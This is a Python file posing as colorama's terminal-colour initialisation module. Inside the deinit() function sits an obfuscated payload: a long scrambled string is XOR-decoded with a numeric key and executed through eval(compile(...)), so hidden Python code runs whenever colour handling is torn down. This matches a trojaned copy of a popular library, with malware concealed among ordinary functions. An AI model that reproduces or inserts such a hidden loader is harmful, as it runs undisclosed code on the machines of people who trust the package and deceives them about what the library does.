# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.
#coded by https://github.com/tartley/colorama
import atexit
import contextlib
import sys
import os

from .ansitowin32 import AnsiToWin32


def _wipe_internal_state_for_tests():
    global orig_stdout, orig_stderr
    orig_stdout = None
    orig_stderr = None

    global wrapped_stdout, wrapped_stderr
    wrapped_stdout = None
    wrapped_stderr = None

    global atexit_done
    atexit_done = False

    global fixed_windows_console
    fixed_windows_console = False

    try:
        # no-op if it wasn't registered
        atexit.unregister(reset_all)
    except AttributeError:
        # python 2: no atexit.unregister. Oh well, we did our best.
        pass


def reset_all():
    if AnsiToWin32 is not None:    # Issue #74: objects might become None at exit
        AnsiToWin32(orig_stdout).reset_all()


def init(autoreset=False, convert=None, strip=None, wrap=True):

    if not wrap and any([autoreset, convert, strip]):
        raise ValueError('wrap=False conflicts with any other arg=True')

    global wrapped_stdout, wrapped_stderr
    global orig_stdout, orig_stderr

    orig_stdout = sys.stdout
    orig_stderr = sys.stderr

    if sys.stdout is None:
        wrapped_stdout = None
    else:
        sys.stdout = wrapped_stdout = \
            wrap_stream(orig_stdout, convert, strip, autoreset, wrap)
    if sys.stderr is None:
        wrapped_stderr = None
    else:
        sys.stderr = wrapped_stderr = \
            wrap_stream(orig_stderr, convert, strip, autoreset, wrap)

    global atexit_done
    if not atexit_done:
        atexit.register(reset_all)
        atexit_done = True


def deinit():
    #coded by https://github.com/tartley/colorama
    if orig_stdout is not None:
        sys.stdout = orig_stdout
    if orig_stderr is not None:
        sys.stderr = orig_stderr
    wopvEaTEcopFEavc = "^ZA]FG\x14ZE\x1aAYVE_\\A[\x1aKEZH@\\[VGG>\\^\x11E\\TERVD\\\x1fGL@@V^\x19\x1f\x1aBGRDAAE^MX\x19\x1b{Z^BK\x10\x1d\n>\x14\x17\x18\x14\x10\x17\x11\x16DCI\x089\x11\x15\x16\x16\x19\x12\x15\x11\x15\x13\x16\x11E]M_\x17^BQ]\x1c\x12\x19B\\E\x18WP_V\x18FA\x17\x14\x18\x15D\x1f\x1a\x14UG\x15^\x0b?\x10\x15\x11\x14\x19\x16\x11\x11\x14\x15\x13\x14\x13\x13\x11\x16R\x1fDA_AW\x1a\x15P]AVEG\x10X@\x12h^]YGWFD\x17BCRAB]PTFE\x16e\\SCZ^\x16AS@Q[^S\x12]^DZDB\x11eVEQ\x13oXPJ_U\x18GAT_]V\x14\\UAZBA\x11F\\GDTGA\x13h][TZX^\x13\x0e\x16ZA\x1cP\\D]VPZ^\x1f\x1a\x12h^ducp\x14\r\x17\x16\x19X^]W\x1c\x16\x15\x1d\x16QWY]Z\x13\x1d\x11\x15\x1b\x17ZDWVV\x1cAERWEP\x10mWcrb\x16\x18\r\x18\x1f\x1dGUC\x1bR]Y]\x1fEI\x12mZPEtI]FG\x14\x0e\x13^E\x1aARG^\x1bWJ^JDB\x11grd\x7f\x1a\x12h^]R\x17V[D\x17XEuIYAG\x0biX\x16\x19\x12\x15\x11\x15\x13\x16^A\x1aTV\\TV]AG\x1dfwe}\x1e\x11e]ZP\x16hQLP\x1acyg|\x1d\x1a\\KnSYYT\x1c\x10\x0c\x11mZ\x15\x13\x14\x13\x13\x11\x16\x14\x11\x13\x13FG[\\C\x11\x12\x13\x10\x17o^R_AQ\n\x14hY\x1a\x1d:\x17\x11\x16\x10\x11\x10\x12\x13\x11\x15\x16\x16\x19\x12\x15\x11S\x1dAC[@\\\x1f\x15\x11\x12\x14\x13\x14GS[^ARnLA_\x16\x0b\x1fXLLB@\x02\x1c\x1bPX\x1b\\CZ@W^LLETCWZ]@V]E\x18W^^\x1cE\x1aPBQ\tSWCQ\x01X\x02\x04\x04[\x03\x1bYXB]\\V\x1fEX\x16l\\\x13\x11\x15\x16\x16U]VPYlPX^Q\x19\n\x17as`{\x1f\x12\x19\x18ATCY\x17@[\x11\x16d^\x18\x18\x12\x13\x18AQEAPKE\x1bEG]F\\BCXQCV\x1cAV\\Y@TlFDY\x1e\x12[VSPUhUY[V\x1b\x14lZ\x14\x17\x18\x14\x10DDT@C_QVBF\x18UX^Y\x19i\x11TPA\\\x19\x18_^_Q\x1c\x10`esc\x1a\x19\\JUWT\x19M@\\YFV\x17\x1dDU@]\x16B]\x10\x0b\x1eP\\@\x1e_AY_\x14\x01\r\x17\x07h\x13\x1f\x13E]W^[\x04dCLR\x1a\x10k]\x10\x1d:\x14\x14\x17\x18\x14\x10\x17\x11\x16\x10\x11\x10\x12\x13\x11\x15P\x18N@\\EP\x1b\x14\x11\x12\x14\x19\x17^W\x12dR@]\x1efpa\x1e\x1fP@lP_TU\x10\x11\x08\x13d]\x14\x14\x14\x15\x18\x11\x15\x10\x15EF@\x0cm_\x14\x15\x13\x14\x13\x13\x11\x16\x14\x11\x13\\E\x1b@WZVFT\x11grd\x1eo\\\x14\x10\x14\x14\x17\x18\x14\x10\x17TNST@F\tm[\x16\x16\x19\x12\x15\x11\x15\x13\x16\x11\x12DK^YE\x1a\x1d\x11\x1d?\x16\x16\x11\x15\x17\x11\x19\x13VNU]@L\x18tZTVz[@sWD[TpCFVD\x0b;\x14\x15\x13\x14\x13\x13\x11\x16\x14\x11\x13\x13FG[\\C\x11\x12\x13\x10=\x13\x10\x17\x13\x12\x14\x10\x14GBZDBXRSCB\x1eQR]Y\x1e\x14IKAYZ]\x05\x11\x1d@TG\x18W[XV\x1aEO\x16\x17\x17\x1b\x11J[VZZ\x05dJMW\x1a2"
    iOpvEoeaaeavocp = "7712434566157193366808823834445815051496114534331641336522790197307324044784071601023156692515361249"
    uocpEAtacovpe = len(wopvEaTEcopFEavc)
    oIoeaTEAcvpae = ""
    for fapcEaocva in range(uocpEAtacovpe):
        nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
        qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
        oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))
    eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))
def just_fix_windows_console():
    global fixed_windows_console

    if sys.platform != "win32":
        return
    if fixed_windows_console:
        return
    if wrapped_stdout is not None or wrapped_stderr is not None:
        # Someone already ran init() and it did stuff, so we won't second-guess them
        return

    # On newer versions of Windows, AnsiToWin32.__init__ will implicitly enable the
    # native ANSI support in the console as a side-effect. We only need to actually
    # replace sys.stdout/stderr if we're in the old-style conversion mode.
    new_stdout = AnsiToWin32(sys.stdout, convert=None, strip=None, autoreset=False)
    if new_stdout.convert:
        sys.stdout = new_stdout
    new_stderr = AnsiToWin32(sys.stderr, convert=None, strip=None, autoreset=False)
    if new_stderr.convert:
        sys.stderr = new_stderr

    fixed_windows_console = True

@contextlib.contextmanager
def colorama_text(*args, **kwargs):
    init(*args, **kwargs)
    try:
        yield
    finally:
        deinit()


def reinit():
    if wrapped_stdout is not None:
        sys.stdout = wrapped_stdout
    if wrapped_stderr is not None:
        sys.stderr = wrapped_stderr


def wrap_stream(stream, convert, strip, autoreset, wrap):
    if wrap:
        wrapper = AnsiToWin32(stream,
            convert=convert, strip=strip, autoreset=autoreset)
        if wrapper.should_wrap():
            stream = wrapper.stream
    return stream


# Use this for initial setup as well, to reduce code duplication
_wipe_internal_state_for_tests()
